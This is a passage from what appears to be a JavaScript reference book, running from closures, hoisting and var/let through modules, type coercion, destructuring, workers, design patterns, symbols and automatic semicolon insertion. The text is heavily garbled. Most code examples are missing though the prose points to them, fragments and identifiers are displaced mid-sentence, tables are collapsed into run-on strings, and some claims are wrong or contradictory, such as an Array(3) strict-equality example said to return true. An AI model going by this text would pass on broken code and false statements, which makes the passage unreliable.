This lets us do some interesting things, such as defining "private" variables that are visible only to a specific function or set of functions. A contrived (but popular) example:


makeCounter() is called, a snapshot of the context of that function is saved. All code inside makeCounterWhen ()
makeCounterwill use that snapshot in their execution. Two calls of () will thus create two different snapshots, with their own copy of counter.
Immediately-invoked function expressions (IIFE)
Closures are also used to prevent global namespace pollution, often through the use of immediately-invoked function expressions.
Immediately-invoked function expressions (or, perhaps more intuitively, self-executing anonymous functions) are essentially closures that are called right after declaration. The general idea with IIFE's is to invoke the side-effect of creating a separate context that is accessible only to the code within the IIFE.
Suppose we want to be able to reference jQuery with $. Consider the naive method, without using an IIFE:

In the following example, an IIFE is used to ensure that the $ is bound to jQuery only in the context created by the closure:

See the canonical answer on Stackoverflow for more information on closures.
Section 56.2: Hoisting
What is hoisting?
Hoisting is a mechanism which moves all variable and function declarations to the top of their scope. However, variable assignments still happen where they originally were.
For example, consider the following code:

The above code is the same as:

Note that due to hoisting the above undefined is not the same as the not defined resulting from running:

A similar principle applies to functions. When functions are assigned to a variable (i.e. a function expression), the variable declaration is hoisted while the assignment remains in the same place. The following two code snippets are equivalent.

When declaring function statements, a different scenario occurs. Unlike function statements, function declarations are hoisted to the top of their scope. Consider the following code:

The above code is the same as the next code snippet due to hoisting:

Here are some examples of what is and what isn't hoisting:


Limitations of Hoisting
Initializing a variable can not be Hoisted or In simple JavaScript Hoists declarations not initialization.
For example: The below scripts will give different outputs.

This will give you an output of 6. But this...

This will give you an output of NaN. Since we are initializing the value of y, the JavaScript Hoisting is not happening, so the y value will be undefined. The JavaScript will consider that y is not yet declared.
So the second example is same as of below.

This will give you an output of NaN.

Section 56.3: Dierence between var and let
(Note: All examples using let are also valid for const)
var is available in all versions of JavaScript, while let and const are part of ECMAScript 6 and only available in some newer browsers. var is scoped to the containing function or the global space, depending when it is declared:

That means it "escapes" if statements and all similar block constructs:



Note that i and j are only declared in the for loop and are therefore undeclared outside of it.
There are several other crucial differences:
Global variable declaration
In the top scope (outside any functions and blocks), var declarations put an element in the global object. let does not:

Re-declaration
Declaring a variable twice using var doesn't produce an error (even though it's equivalent to declaring it once):

With let, this produces an error:


However variables declared with let can be reused (not re-declared) in a nested block

Within the block the outer i can be accessed, but if the within block has a let declaration for i, the outer i can not be accessed and will throw a ReferenceError if used before the second is declared.


Hoisting
Variables declared both with var and let are hoisted. The difference is that a variable declared with var can be referenced before its own assignment, since it gets automatically assigned (with undefined as its value), but let cannot-it specifically requires the variable to be declared before being invoked:

The area between the start of a block and a let or const declaration is known as the Temporal Dead Zone, and any references to the variable in this area will cause a ReferenceError. This happens even if the variable is assigned before being declared:

In non-strict-mode, assigning a value to a variable without any declaration, automatically declares the variable in the global scope. In this case, instead of y being automatically declared in the global scope, let reserves the variable's name (y) and does not allow any access or assignment to it before the line where it is declared/initialized.
Section 56.4: Apply and Call syntax and invocation
The apply and call methods in every function allow it to provide a custom value for this.

You might notice that the syntax for both the invocations used above are the same. i.e. The signature looks similar.
But there is a small difference in their usage, since we are dealing with functions and changing their scopes, we still need to maintain the original arguments passed to the function. Both apply and call support passing arguments to the target function as follows:

Notice that apply allows you to pass an Array or the arguments object (array-like) as the list of arguments, whereas, call needs you to pass each argument separately.
These two methods give you the freedom to get as fancy as you want, like implementing a poor version of the ECMAScript's native bind to create a function that will always be called as a method of an object from an original function.

This will log
		"Foo"
The bind function has a lot going on
1. obj will be used as the value of this
2. forward the arguments to the function
3. and then return the value
  Section 56.5: Arrow function invocation
Version ≥ 6
When using arrow functions this takes the value from the enclosing execution context's this (that is, this in arrow functions has lexical scope rather than the usual dynamic scope). In global code (code that doesn't belong to any function) it would be the global object. And it keeps that way, even if you invoke the function declared with the arrow notation from any of the others methods here described.

See how this inherits the context rather than referring to the object the method was called on.


Section 56.6: Bound invocation
The bind method of every function allows you to create new version of that function with the context strictly bound to a specific object. It is especially useful to force a function to be called as a method of an object.

This will log:
		bar
Section 56.7: Method invocation
Invoking a function as a method of an object the value of this will be that object.

We can now invoke print as a method of obj. this will be obj

This will thus log:
		Foo
Section 56.8: Anonymous invocation
Invoking a function as an anonymous function, this will be the global object (self in the browser).

Version = 5
In ECMAScript 5's strict mode, this will be undefined if the function is invoked anonymously.

This will output
 undefined
Section 56.9: Constructor invocation
When a function is invoked as a constructor with the new keyword this takes the value of the object being constructed

This will log
		{ name: "Foo" }
Section 56.10: Using let in loops instead of var (click handlers example)
Let's say we need to add a button for each piece of loadedData array (for instance, each button should be a slider showing the data; for the sake of simplicity, we'll just alert a message). One may try something like this:
for(var i = 0; i < loadedData.length; i++)     jQuery("#container").append("<a class='button'>"+loadedData[i].label+"</a>")
        .children().last() // now let's attach a handler to the button which is a child
        .on("click",function() { alert(loadedData[i].content); });
But instead of alerting, each button will cause the
		TypeError: loadedData[i] is undefined
i == error. This is because the scope of i is the global scope (or a function scope) and after the loop, 3. What we need is not to "remember the state of i". This can be done using let:
for(let i = 0; i < loadedData.length; i++)     jQuery("#container").append("<a class='button'>"+loadedData[i].label+"</a>")
        .children().last() // now let's attach a handler to the button which is a child
         .on("click",function() { alert(loadedData[i].content); }); An example of loadedData to be tested with this code:
    var loadedData = [         { label:"apple",      content:"green and round" },
        { label:"blackberry", content:"small black or blue" },
        { label:"pineapple",  content:"weird stuff.. difficult to explain the shape" }     ];
A fiddle to illustrate this

Chapter 57: Modules
Section 57.1: Defining a module
In ECMAScript 6, when using the module syntax (import/export), each file becomes its own module with a private namespace. Top-level functions and variables do not pollute the global namespace. To expose functions, classes, and variables for other modules to import, you can use the export keyword.

<scriptNote: ES5 JavaScript files loaded via > tags will remain the same when not using import/export.
Only the values which are explicitly exported will be available outside of the module. Everything else can be considered private or inaccessible.
my-module.jsImporting this module would yield (assuming the previous code block is in ):
import * as myModule from './my-module.js';
myModule.PI;                 // 3.14 myModule.doSomething();      // 'Hello from a module!' myModule.doSomethingElse();  // 'Something else' new myModule.MyClass();      // an instance of MyClass
myModule.somethingPrivate(); // This would fail since somethingPrivate was not exported
Section 57.2: Default exports
In addition to named imports, you can provide a default export.

You can use a simplified syntax to import the default export.

Note that a default export is implicitly equivalent to a named export with the name default, and the imported binding (circleArea above) is simply an alias. The previous module can be written like

You can only have one default export per module. The name of the default export can be omitted.

Section 57.3: Importing named members from another module
test.jsGiven that the module from the Defining a Module section exists in the file , you can import from that module and use its exported members:

somethingPrivateThe () method was not exported from the test module, so attempting to import it will fail:

Section 57.4: Importing an entire module
In addition to importing named members from a module or a module's default export, you can also import all members into a namespace binding.

All exported members are now available on the test variable. Non-exported members are not available, just as they are not available with named member imports.
Note: The path to the module './test' is resolved by the loader and is not covered by the ECMAScript specification - this could be a string to any resource (a path - relative or absolute - on a filesystem, a URL to a network resource, or any other string identifier).
Section 57.5: Importing named members with aliases
Sometimes you may encounter members that have really long member names, such as
thisIsWayTooLongOfAName(). In this case, you can import the member and give it a shorter name to use in your
current module:

You can import multiple long member names like this:

And finally, you can mix import aliases with the normal member import:

Section 57.6: Importing with side eects
Sometimes you have a module that you only want to import so its top-level code gets run. This is useful for polyfills, other globals, or configuration that only runs once when your module is imported.
test.jsGiven a file named :

You can use it like this:

This example will print Initializing... to the console.
Section 57.7: Exporting multiple named members

Chapter 58: Screen
Section 58.1: Getting the screen resolution
To get the physical size of the screen (including window chrome and menubar/launcher):

Section 58.2: Getting the "available" area of the screen
To get the "available" area of the screen (i.e. not including any bars on the edges of the screen, but including window chrome and other windows:

Section 58.3: Page width and height
To get current page width and height (for any browser), e.g. when programming responsiveness:
function pageWidth() {   return window.innerWidth != null? window.innerWidth : document.documentElement && document.documentElement.clientWidth ? document.documentElement.clientWidth : document.body != null ? document.body.clientWidth : null; }
function pageHeight() {   return  window.innerHeight != null? window.innerHeight : document.documentElement && document.documentElement.clientHeight ? document.documentElement.clientHeight : document.body != null? document.body.clientHeight : null; }
Section 58.4: Window innerWidth and innerHeight Properties
Get the window height and width

Section 58.5: Getting color information about the screen
To determine the color and pixel depths of the screen:

Chapter 59: Variable coercion/conversion
Section 59.1: Double Negation (!!x)
The double-negation !! is not a distinct JavaScript operator nor a special syntax but rather just a sequence of two negations. It is used to convert the value of any type to its appropriate true or false Boolean value depending on whether it is truthy or falsy.

The first negation converts any value to false if it is truthy and to true if is falsy. The second negation then operates on a normal Boolean value. Together they convert any truthy value to true and any falsy value to false.
However, many professionals consider the practice of using such syntax unacceptable and recommend simpler to read alternatives, even if they're longer to write:
x !== 0        // instead of !!x in case x is a number
x != null      // instead of !!x in case x is an object, a string, or an undefined
!!Usage of x is considered poor practice due to the following reasons:
1. Stylistically it may look like a distinct special syntax whereas in fact it is not doing anything other than two consecutive negations with implicit type conversion.
2. It is better to provide information about types of values stored in variables and properties through the code.
x !== 0 says that x is probably a number, whereas !!For example, x does not convey any such advantage to readers of the code.
Boolean3. Usage of (x) allows for similar functionality, and is a more explicit conversion of type.
  Section 59.2: Implicit conversion
JavaScript will try to automatically convert variables to more appropriate types upon use. It's usually advised to do conversions explicitly (see other examples), but it's still worth knowing what conversions take place implicitly.
"1" + 5 === "15" // 5 got converted to string.
1 + "5" === "15" // 1 got converted to string. 1 - "5" === -4 // "5" got converted to a number. alert({}) // alerts "[object Object]", {} got converted to string.
 !0 === true // 0 got converted to boolean if ("hello") {} // runs, "hello" got converted to boolean. new Array(3) === ",,"; // Return true. The array is converted to string - Array.toString(); Some of the trickier parts:
!"0" === false // "0" got converted to true, then reversed.
!"false" === false // "false" converted to true, then reversed.
Section 59.3: Converting to boolean
Boolean(...) will convert any data type into either true or false.

Empty strings and the number 0 will be converted to false, and all others will be converted to true.
A shorter, but less clear, form:

This shorter form takes advantage of implicit type conversion using the logical NOT operator twice, as described in http://stackoverflow.com/documentation/javascript/208/boolean-logic/3047/double-negation-x
Here is the complete list of boolean conversions from the ECMAScript specification
Boolean(myArg) === falseBoolean(myArg) === myArgBoolean(myArg) === falseBoolean(myArg) === falseBoolean(myArg) === trueif myArg of type undefined or null then if myArg of type boolean then 
if myArg of type number then  if myArg is +0, ‑0, or NaN; otherwise true if myArg of type string then  if myArg is the empty String (its length is zero); otherwise true
if myArg of type symbol or object then 
Values that get converted to false as booleans are called falsy (and all others are called truthy). See Comparison Operations.
Section 59.4: Converting a string to a number

Number('0') will convert the string ('0') into a number (0)
A shorter, but less clear, form:

The unary + operator does nothing to numbers, but converts anything else to a number.
12) === -12Interestingly, +(-.

parseInt('0', 10) will convert the string ('0') into a number (0), don't forget the second argument, which is radix.
If not given, parseInt could convert string to wrong number.
Section 59.5: Converting a number to a string

String(0) will convert the number (0) into a string ('0').
A shorter, but less clear, form:

Section 59.6: Primitive to Primitive conversion table
	Value	Converted To String Converted To Number Converted To Booleanundefinded	"undefined"NaNfalsenull	"null"0falsetrue	"true"1false	"false"0NaN	"NaN"false"" empty string0false" "0true"2.4" (numeric)2.4true"test" (non numericNaNtrue"0"0true"1"1true-0"0"false0"0"false1"1"trueInfinity"Infinity"true-Infinity"-Infinity"true[]""0true[3]"3"3true['a']"a"NaNtrue['a','b']"a,b"NaNtrue{ }"[object Object]"NaNtruefunction(){}"function(){}"NaNtrueBold values highlight conversion that programmers may find surprising
To convert explicitly values you can use String() Number() Boolean()
Section 59.7: Convert an array to a string
Array.join(separator) can be used to output an array as a string, with a configurable separator.
Default (separator = ","):

With a string separator:

With a blank separator:

Section 59.8: Array to String using array methods
This way may seem to be useless because you are using anonymous function to accomplish something that you can do it with join(); But if you need to make something to the strings while you are converting the Array to String, this can be useful.

Section 59.9: Converting a number to a boolean

Boolean(0) will convert the number 0 into a boolean false.
A shorter, but less clear, form:

Section 59.10: Converting a string to a boolean
To convert a string to boolean use

or the shorter but less clear form

All strings except the empty string (of length zero) are evaluated to true as booleans.

Section 59.11: Integer to Float
In JavaScript, all numbers are internally represented as floats. This means that simply using your integer as a float is all that must be done to convert it.
Section 59.12: Float to Integer
To convert a float to an integer, JavaScript provides multiple methods.
The floor function returns the first integer less than or equal to the float.

The ceil function returns the first integer greater than or equal to the float.

The round function rounds the float.

Truncation (trunc) removes the decimals from the float.

Notice the difference between truncation (trunc) and floor:

Section 59.13: Convert string to float
parseFloat accepts a string as an argument which it converts to a float/

Chapter 60: Destructuring assignment
Destructuring is a pattern matching technique that is added to JavaScript recently in ECMAScript 6.
It allows you to bind a group of variables to a corresponding set of values when their pattern matches to the right hand-side and the left hand-side of the expression.
Section 60.1: Destructuring Objects
Destructuring is a convenient way to extract properties from objects into variables.
Basic syntax:

Destructuring and renaming:

Destructuring with default values:

Destructuring and renaming with default values

// Is equivalent to
let p = person.hasOwnProperty('phone') ? person.phone : '123-456-789'; // '123-456-789'
Section 60.2: Destructuring function arguments
Pull properties from an object passed into a function. This pattern simulates named parameters instead of relying on argument position.

This also works for arrays:

Section 60.3: Nested Destructuring
We are not limited to destructuring an object/array, we can destructure a nested object/array.
Nested Object Destructuring

Nested Array Destructuring


Destructuring is not just limited to a single pattern, we can have arrays in it, with n-levels of nesting. Similarly we can destructure arrays with objects and vice-versa.
Arrays Within Object

Objects Within Arrays

Section 60.4: Destructuring Arrays

We can set default value in destructuring array, see the example of Default Value While Destructuring.
With destructuring array, we can swap the values of 2 variables easily:

We can specify empty slots to skip unneeded values:

Section 60.5: Destructuring inside variables
Aside from destructuring objects into function arguments, you can use them inside variable declarations as follows:

let { name, age, location } = person;
console.log('I am ' + name + ', aged ' + age + ' and living in ' + location + '.');
// -> "I am John Doe aged 45 and living in Paris, France."
As you can see, three new variables were created: name, age and location and their values were grabbed from the object person if they matched key names.
Section 60.6: Default Value While Destructuring
We often encounter a situation where a property we're trying to extract doesn't exist in the object/array, resulting in a TypeError (while destructuring nested objects) or being set to undefined. While destructuring we can set a default value, which it will fallback to, in case of it not being found in the object.

Section 60.7: Renaming Variables While Destructuring
Destructuring allows us to refer to one key in an object, but declare it as a variable with a different name. The syntax looks like the key-value syntax for a normal JavaScript object.

Chapter 61: WebSockets
Parameter	Details
url	The server url supporting this web socket connection. data	The content to send to the host. message	The message received from the host.
WebSocket is protocol, which enables two-way communication between a client and server:
The goal WebSocket is to provide a mechanism for browser-based applications that need two-way communication with servers that does not rely on opening multiple HTTP connections. (RFC 6455)
WebSocket works over HTTP protocol.
Section 61.1: Working with string messages

Section 61.2: Establish a web socket connection

Section 61.3: Working with binary messages


Section 61.4: Making a secure web socket connection

This uses the wss instead of ws to make a secure web socket connection which make use of HTTPS instead of HTTP

Chapter 62: Arrow Functions
Arrow functions are a concise way of writing anonymous, lexically scoped functions in ECMAScript 2015 (ES6).
Section 62.1: Introduction
In JavaScript, functions may be anonymously defined using the "arrow" (=>) syntax, which is sometimes referred to as a lambda expression due to Common Lisp similarities.
The simplest form of an arrow function has its arguments on the left side of => and the return value on the right side:

This function can be immediately invoked by providing an argument to the expression:

If an arrow function takes a single parameter, the parentheses around that parameter are optional. For example, the following expressions assign the same type of function into constant variables:

However, if the arrow function takes no parameters, or more than one parameter, a new set of parentheses must encase all the arguments:

If the function body doesn't consist of a single expression, it must be surrounded by brackets and use an explicit return statement for providing a result:

If the arrow function's body consists only of an object literal, this object literal has to be enclosed in parentheses:

The extra parentheses indicate that the opening and closing brackets are part of the object literal, i.e. they are not delimiters of the function body.
Section 62.2: Lexical Scoping & Binding (Value of "this")
Arrow functions are lexically scoped; this means that their this Binding is bound to the context of the surrounding scope. That is to say, whatever this refers to can be preserved by using an arrow function.
Take a look at the following example. The class Cow has a method that allows for it to print out the sound it makes after 1 second.

makeSoundLaterbetsy.makeSoundLaterIn the () method, the this context refers to the current instance of the Cow object, so in the case where I call (), the this context refers to betsy.
this.soundBy using the arrow function, I preserve the this context so that I can make reference to  when it comes time to print it out, which will properly print out "moo".
If you had used a regular function in place of the arrow function, you would lose the context of being within the class, and not be able to directly access the sound property.
Section 62.3: Arguments Object
Arrow functions do not expose an arguments object; therefore, arguments would simply refer to a variable in the current scope.

Due to this, arrow functions are also not aware of their caller/callee.
While the lack of an arguments object can be a limitation in some edge cases, rest parameters are generally a suitable alternative.

Section 62.4: Implicit Return
Arrow functions may implicitly return values by simply omitting the curly braces that traditionally wrap a function's body if their body only contains a single expression.

When using implicit returns, object literals must be wrapped in parenthesis so that the curly braces are not mistaken for the opening of the function's body.
const foo = () => { bar: 1 } // foo() returns undefined const foo = () => ({ bar: 1 }) // foo() returns {bar: 1}
Section 62.5: Arrow functions as a constructor
Arrow functions will throw a TypeError when used with the new keyword.

Section 62.6: Explicit Return
Arrow functions can behave very similar to classic functions in that you may explicitly return a value from them using the return keyword; simply wrap your function's body in curly braces, and return a value:

Chapter 63: Workers
Section 63.1: Web Worker
A web worker is a simple way to run scripts in background threads as the worker thread can perform tasks (including I/O tasks using XMLHttpRequest) without interfering with the user interface. Once created, a worker can send messages which can be different data types (except functions) to the JavaScript code that created it by posting messages to an event handler specified by that code (and vice versa.)
Workers can be created in a few ways.
The most common is from a simple URL:

URL.createObjectURLIt's also possible to create a Worker dynamically from a string using ():

Function.toStringThe same method can be combined with () to create a worker from an existing function:

Section 63.2: A simple service worker
main.js
A service worker is an event-driven worker registered against an origin and a path. It takes the form of a JavaScript file that can control the web page/site it is associated with, intercepting and modifying navigation and resource requests, and caching resources in a very granular fashion to give you complete control over how your app behaves in certain situations (the most obvious one being when the network is not available.)
Source: MDN
Few Things:
1. It's a JavaScript Worker, so it can't access the DOM directly
2. It's a programmable network proxy
3. It will be terminated when not in use and restarted when it's next needed
4. A service worker has a lifecycle which is completely separate from your web page
5. HTTPS is Needed
<scriptThis code that will be executed in the Document context, (or) this JavaScript will be included in your page via a > tag.

sw.js
This is the service worker code and is executed in the ServiceWorker Global Scope.

Section 63.3: Register a service worker

js/sw.js can only intercept fetch requests for files that begin with /js//. For this reason you usually see the
      SW file at the top-level directory of the project.
   Section 63.4: Communicating with a Web Worker
Since workers run in a separate thread from the one that created them, communication needs to happen via postMessage.
Note: Because of the different export prefixes, some browsers have webkitPostMessage instead of postMessage. You should override postMessage to make sure workers "work" (no pun intended) in the most places possible: worker.postMessage = (worker.webkitPostMessage || worker.postMessage);
From the main thread (parent window):


webworker.jsFrom the worker, in :

Alternatively, you can also add event listeners using onmessage:
From the main thread (parent window):

webworker.jsFrom the worker, in :

Section 63.5: Terminate a worker
Once you are done with a worker you should terminate it. This helps to free up resources for other applications on the user's computer.
Main Thread:

Note: The terminate method is not available for service workers. It will be terminated when not in use, and restarted when it's next needed.
Worker Thread:

Section 63.6: Populating your cache
After your service worker is registered, the browser will try to install & later activate the service worker.
Install event listener

Caching
One can use this install event returned to cache the assets needed to run the app offline. Below example uses the cache api to do the same.

Section 63.7: Dedicated Workers and Shared Workers
Dedicated Workers
A dedicated web worker is only accessible by the script that called it.
Main application:

worker.js:

Shared Workers
A shared worker is accessible by multiple scripts - even if they are being accessed by different windows, iframes or even workers.
Creating a shared worker is very similar to how to create a dedicated one, but instead of the straight-forward communication between the main thread and the worker thread, you'll have to communicate via a port object, i.e., an explicit port has to be opened so multiple scripts can use it to communicate with the shared worker. (Note that dedicated workers do this implicitly) Main application

worker.js

port.startNote that setting up this message handler in the worker thread also implicitly opens the port connection back to the parent thread, so the call to () is not actually needed, as noted above.

Chapter 64: requestAnimationFrame
Parameter	Details
           "A parameter specifying a function to call when it's time to update your animation for the next callback
repaint." (https://developer.mozilla.org/en-US/docs/Web/API/window/requestAnimationFrame)
Section 64.1: Use requestAnimationFrame to fade in element
View jsFiddle: https://jsfiddle.net/HimmatChahal/jb5trg67/ Copy + Pasteable code below:
<html>
    <body>
        <h1>This will fade in at 60 frames per second (or as close to possible as your hardware allows)</h1>        
        <script>             // Fade in over 2000 ms = 2 seconds.
            var FADE_DURATION = 2.0 * 1000;            
            // -1 is simply a flag to indicate if we are rendering the very 1st frame             var startTime=-1.0;
           
            // Function to render current frame (whatever frame that may be)             function render(currTime) {                 var head1 = document.getElementsByTagName('h1')[0];            
                // How opaque should head1 be?  Its fade started at currTime=0.
                // Over FADE_DURATION ms, opacity goes from 0 to 1                 var opacity = (currTime/FADE_DURATION);                 head1.style.opacity = opacity;             }
                       // Function to             function eachFrame() {
                // Time that animation has been running (in ms)
                // Uncomment the console.log function to view how quickly                 // the timeRunning updates its value (may affect performance)                 var timeRunning = (new Date()).getTime() - startTime;                 //console.log('var timeRunning = '+timeRunning+'ms');                 if (startTime < 0) {
                   // This branch: executes for the first frame only.                    // it sets the startTime, then renders at currTime = 0.0                    startTime = (new Date()).getTime();                    render(0.0);
               } else if (timeRunning < FADE_DURATION) {
                   // This branch: renders every frame, other than the 1st frame,
                   // with the new timeRunning value.                    render(timeRunning);                } else {                    return;                }
           
               // Now we are done rendering one frame.
               // So we make a request to the browser to execute the next
               // animation frame, and the browser optimizes the rest.
               // This happens very rapidly, as you can see in the console.log();                window.requestAnimationFrame(eachFrame);
           };

Section 64.2: Keeping Compatibility
Of course, just like most things in browser JavaScript, you just can't count on the fact that everything will be the same everywhere. In this case, requestAnimationFrame might have a prefix on some platforms and are named differently, such as webkitRequestAnimationFrame. Fortunately, there's a really easy way to group all the known differences that could exist down to 1 function:

Note that the last option (which fills in when no existing support was found) will not return an id to be used in cancelAnimationFrame. There is, however an efficient polyfill that was written which fixes this.
Section 64.3: Cancelling an Animation
To cancel a call to requestAnimationFrame, you need the id it returned from when it was last called. This is the parameter you use for cancelAnimationFrame. The following example starts some hypothetical animation then pauses it after one second.



Chapter 65: Creational Design Patterns
Design patterns are a good way to keep your code readable and DRY. DRY stands for don't repeat yourself. Below you could find more examples about the most important design patterns.
Section 65.1: Factory Functions
A factory function is simply a function that returns an object.
Factory functions do not require the use of the new keyword, but can still be used to initialize an object, like a constructor.
Often, factory functions are used as API wrappers, like in the cases of jQuery and moment.js, so users do not need to use new.
The following is the simplest form of factory function; taking arguments and using them to craft a new object with the object literal:

It is easy to define private properties and methods in a factory, by including them outside of the returned object.
This keeps your implementation details encapsulated, so you can only expose the public interface to your object.

The last line will give an error because the function formalName is closed inside the cowFactory function. This is a closure.
Factories are also a great way of applying functional programming practices in JavaScript, because they are functions.
Section 65.2: Factory with Composition
'Prefer composition over inheritance' is an important and popular programming principle, used to assign behaviors to objects, as opposed to inheriting many often unneeded behaviors.
Behaviour factories

Object factories
Version ≥ 6

Usage

fred.speak();        // outputs: Fred says Hello fred.moveSlowly();   // outputs: Fred is moving slowly
var snowy = rabbit('Snowy', 'white'); snowy.moveSlowly();  // outputs: Snowy is moving slowly snowy.moveQuickly(); // outputs: Snowy is moving quickly snowy.speak();       // ERROR: snowy.speak is not a function
Section 65.3: Module and Revealing Module Patterns
Module Pattern
The Module pattern is a creational and structural design pattern which provides a way of encapsulating private members while producing a public API. This is accomplished by creating an IIFE which allows us to define variables only available in its scope (through closure) while returning an object which contains the public API.
This gives us a clean solution for hiding the main logic and only exposing an interface we wish other parts of our application to use.

Revealing Module Pattern
The Revealing Module pattern is a variant in the Module pattern. The key differences are that all members (private and public) are defined within the closure, the return value is an object literal containing no function definitions, and all references to member data are done through direct references rather than through the returned object.


Revealing Prototype Pattern
This variation of the revealing pattern is used to separate the constructor to the methods. This pattern allow us to use the javascript language like a objected oriented language:

This code above should be in a separated file .js to be referenced in any page that is needed. It can be used like this:

Section 65.4: Prototype Pattern
The prototype pattern focuses on creating an object that can be used as a blueprint for other objects through prototypal inheritance. This pattern is inherently easy to work with in JavaScript because of the native support for prototypal inheritance in JS which means we don't need to spend time or effort imitating this topology. Creating methods on the prototype

Prototypal Inheritance
Inheriting from a 'parent object' is relatively easy via the following pattern
ChildObject.prototype = Object.create(ParentObject.prototype);
ChildObject.prototype.constructor = ChildObject;
Where ParentObject is the object you wish to inherit the prototyped functions from, and ChildObject is the new Object you wish to put them on.
If the parent object has values it initializes in its constructor you need to call the parents constructor when initializing the child.
You do that using the following pattern in the ChildObject constructor.

A complete example where the above is implemented


Section 65.5: Singleton Pattern
The Singleton pattern is a design pattern that restricts the instantiation of a class to one object. After the first object is created, it will return the reference to the same one whenever called for an object.

Usage:
// there is no existing instance of Singleton, so it will create one var instance1 = Singleton.getInstance();
// there is an instance of Singleton, so it will return the reference to this one var instance2 = Singleton.getInstance(); console.log(instance1 === instance2); // true
Section 65.6: Abstract Factory Pattern
The Abstract Factory Pattern is a creational design pattern that can be used to define specific instances or classes without having to specify the exact object that is being created.


Chapter 66: Detecting browser
Browsers, as they have evolved, offered more features to JavaScript. But often these features are not available in all browsers. Sometimes they may be available in one browser, but yet to be released on other browsers. Other times, these features are implemented differently by different browsers. Browser detection becomes important to ensure that the application you develop runs smoothly across different browsers and devices.
Section 66.1: Feature Detection Method
This method looks for the existence of browser specific things. This would be more difficult to spoof, but is not guaranteed to be future proof.

Successfully tested in:
Firefox 0.8 - 44
Chrome 1.0 - 48 Opera 8.0 - 34
Safari 3.0 - 9.0.3
IE 6 - 11
Edge - 20-25
Credit to Rob W
Section 66.2: User Agent Detection
<browser name> <versionThis method gets the user agent and parses it to find the browser. The browser name and version are extracted from the user agent through a regex. Based on these two, the > is returned.
The four conditional blocks following the user agent matching code are meant to account for differences in the user agents of different browsers. For example, in case of opera, since it uses Chrome rendering engine, there is an additional step of ignoring that part.
Note that this method can be easily spoofed by a user.

Credit to kennebec
Section 66.3: Library Method
An easier approach for some would be to use an existing JavaScript library. This is because it can be tricky to guarantee browser detection is correct, so it can make sense to use a working solution if one is available.
One popular browser-detection library is Bowser.
Usage example:

Chapter 67: Symbols
Section 67.1: Basics of symbol primitive type
Symbol is a new primitive type in ES6. Symbols are used mainly as property keys, and one of its main characteristics is that they are unique, even if they have the same description. This means they will never have a name clash with any other property key that is a symbol or string.

You can also have named Symbols like:

Each of these values are unique and cannot be overridden.
descriptionSymbol.forProviding an optional parameter () when creating primitive symbols can be used for debugging but not to access the symbol itself (but see the () example for a way to register/lookup global shared symbols).
Section 67.2: Using Symbol.for() to create global, shared symbols
Symbol.forThe  method allows you to register and look up global symbols by name. The first time it is called with a given key, it creates a new symbol and adds it to the registry.

Symbol.for('A'Symbol('A'The next time you call ), the same symbol will be returned instead of a new one (in contrast to ) which would create a new, unique symbol that happens to have the same description).

but

Section 67.3: Converting a symbol into a string
Unlike most other JavaScript objects, symbols are not automatically converted into a string when performing concatenation.

Instead, they have to be explicitly converted into a string when necessary, (for example, to get a textual description of the symbol that can be used in a debug message) using the toString method or the String constructor.


Chapter 68: Transpiling
Transpiling is the process of interpreting certain programming languages and translating it to a specific target language. In this context, transpiling will take compile-to-JS languages and translate them into the target language of JavaScript.
Section 68.1: Introduction to Transpiling
Examples
ES6/ES2015 to ES5 (via Babel): This ES2015 syntax

is interpreted and translated to this ES5 syntax:

CoffeeScript to JavaScript (via built-in CoffeeScript compiler): This CoffeeScript

is interpreted and translated to JavaScript:

How do I transpile?
Most compile-to-JavaScript languages have a transpiler built-in (like in CoffeeScript or TypeScript). In this case, you may just need to enable the language's transpiler via config settings or a checkbox. Advanced settings can also be set in relation to the transpiler.
For ES6/ES2016-to-ES5 transpiling, the most prominent transpiler being used is Babel.
Why should I transpile?
The most cited benefits include:
The ability to use newer syntax reliably
Compatibility among most, if not all browsers
Usage of missing/not yet native features to JavaScript via languages like CoffeeScript or TypeScript
Section 68.2: Start using ES6/7 with Babel
Browser support for ES6 is growing, but to be sure your code will work on environments that don't fully support it, you can use Babel, the ES6/7 to ES5 transpiler, try it out!
If you would like to use ES6/7 in your projects without having to worry about compatibility, you can use Node and Babel CLI
Quick setup of a project with Babel for ES6/7 support
1. Download and install Node
2. Go to a folder and create a project using your favourite command line tool

3. Install Babel CLI

js files, and then a dist/scripts4. Create a scripts folder to store your . folder where the transpiled fully compatible files will be stored.
babelrc5. Create a . file in the root folder of your project, and write this on it

package.json6. Edit your  file (created when you ran npm init) and add the build script to the scripts property:

7. Enjoy programming in ES6/7
8. Run the following to transpile all your files to ES5

For more complex projects you might want to take a look at Gulp or Webpack
Chapter 69: Automatic Semicolon Insertion - ASI
Section 69.1: Avoid semicolon insertion on return statements
The JavaScript coding convention is to place the starting bracket of blocks on the same line of their declaration:

Instead of in the next line:

This has been adopted to avoid semicolon insertion in return statements that return objects:

In most languages the placement of the starting bracket is just a matter of personal preference, as it has no real impact on the execution of the code. In JavaScript, as you've seen, placing the initial bracket in the next line can lead to silent errors.
Section 69.2: Rules of Automatic Semicolon Insertion
		There are three basic rules of semicolon insertion:
1. When, as the program is parsed from left to right, a token (called the offending token) is encountered that is not allowed by any production of the grammar, then a semicolon is automatically inserted before the offending token if one or more of the following conditions is true:
The offending token is separated from the previous token by at least one LineTerminator. The offending token is }.
2. When, as the program is parsed from left to right, the end of the input stream of tokens is encountered and the parser is unable to parse the input token stream as a single complete ECMAScript Program, then a semicolon is automatically inserted at the end of the input stream.
3. When, as the program is parsed from left to right, a token is encountered that is allowed by some production of the grammar, but the production is a restricted production and the token would be the first token for a terminal or nonterminal immediately following the annotation "[no LineTerminator here]" within the restricted production (and therefore such a token is called a restricted token), and the restricted token is separated from the previous token by at least one LineTerminator, then a semicolon is automatically inserted before the restricted token.
However, there is an additional overriding condition on the preceding rules: a semicolon is never inserted automatically if the semicolon would then be parsed as an empty statement or if that semicolon would become one of the two semicolons in the header of a for statement (see 12.6.3).
Source: ECMA-262, Fifth Edition ECMAScript Specification:
Section 69.3: Statements aected by automatic semicolon insertion
do-whileempty statement var statement expression statement  statement continue statement break statement return statement throw statement
Examples:
When the end of the input stream of tokens is encountered and the parser is unable to parse the input token stream as a single complete Program, then a semicolon is automatically inserted at the end of the input stream.

Array indexing/literals

Return statement:


Chapter 70: Localization
ParamaterDetailsweekday"narrow", "short", "long"era"narrow", "short", "long"year"numeric", "2-digit"month"numeric", "2-digit", "narrow", "short", "long"day"numeric", "2-digit"hour"numeric", "2-digit"minute"numeric", "2-digit"second"numeric", "2-digit"timeZoneName "short", "long"
